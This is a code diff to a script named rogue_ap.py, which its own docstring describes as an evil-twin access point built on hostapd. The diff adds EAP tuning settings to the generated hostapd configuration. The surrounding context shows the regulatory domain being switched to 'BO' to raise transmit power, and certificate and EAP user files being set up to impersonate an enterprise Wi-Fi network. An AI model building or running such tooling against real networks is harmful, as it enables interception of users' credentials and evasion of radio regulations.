@@ -1,5 +1,11 @@
+"""
+rogue_ap.py — Evil twin AP via hostapd with optimized EAP
+configuration to prevent retransmit storms and EAPOL resets.
+"""
+
 import subprocess
 import os
+
 
 def set_tx_power(iface, power=30):
     subprocess.run(["iw", "reg", "set", "BO"],
@@ -49,6 +55,12 @@ eap_user_file=/tmp/eapx.eap_user
 ca_cert={cert_dir}/ca.pem
 server_cert={cert_dir}/server.pem
 private_key={cert_dir}/server.key
+
+# ── EAP tuning (prevent retransmit storms) ──
+eap_reauth_period=0
+fragment_size=1400
+
+# ── Logging ──
 logger_stdout=-1
 logger_stdout_level=0
 """
